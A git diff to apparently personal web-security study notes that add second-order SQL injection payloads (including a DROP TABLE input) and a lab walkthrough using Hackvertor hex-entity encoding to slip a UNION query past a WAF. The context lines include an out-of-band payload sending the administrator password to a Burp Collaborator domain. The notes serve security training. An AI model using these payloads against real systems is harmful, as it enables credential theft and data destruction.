@@ -42,6 +42,10 @@
 - [JWT Attacks](#jwt-attacks)
 - [Prototype Pollution](#prototype-pollution)
 - [Essential Skills](#essential-skills)
+
+**Burp extension**  
+- Hackvertor: Encoding and Decoding, data transformation (hashing, encryption, decryptin, convert, string)
+- ddd
   
 ## SQL Injection
 **How to detect**     
@@ -73,7 +77,10 @@
 - `'; EXEC xp_cmdshell('nslookup yourdomain.com') --`
 
 **Second order/Stored Injection**  
-- `TBC`
+- username: `attacker'--`: unauthorized access
+- `INSERT INTO users (username, password) VALUES ('attacker'--', 'password123');`
+- username: `JohnDoe'); DROP TABLE users;--`: delete table
+- `INSERT INTO users (username, password) VALUES ('JohnDoe'); DROP TABLE users;--', 'password123');`  
 
 **Examine the specific database**  
 - DB version: Microsoft, MySQL: @@version； PostgreSQL： version()；Oracle: SELECT banner FROM **v$version**
@@ -184,10 +191,14 @@
     - `FROM dual` is a dummy table used in Oracle databases when a table reference is required but no actual table is necessary.
     - `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
     - In burp colloborator, click button 'Poll now'. Read the description: The Collaborator server received a DNS lookup of type AAAA for the domain name **7rma86kuw6xbyvgxltiy**.7169ftyykb10b1kwbjhbipnfz65wtl.oastify.com  
-35. Item 18
-36. 
-
-
+35. SQL injection with **filter bypass** via **XML encoding**
+    - Search for **XML body parameter** `<storeId>1</storeId>`
+    - Install Burp extensions:**Hackvertor**
+    - `<storeId>1 UNION SELECT NULL</storeId>` **WAF detected**
+    - Highlight your input, right=click, then select Extensions > Hackvertor > Encode > **hex_entities**
+      `<@hex_entities>1 UNION SELECT NULL<@/hex_entities>`
+    - **Concatenate** the returned usernames and password: administrator~seqzzom9u0zc7ixuy3cg  
+      `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`
 
 ## Path Traversal
 Content for Path Traversal...
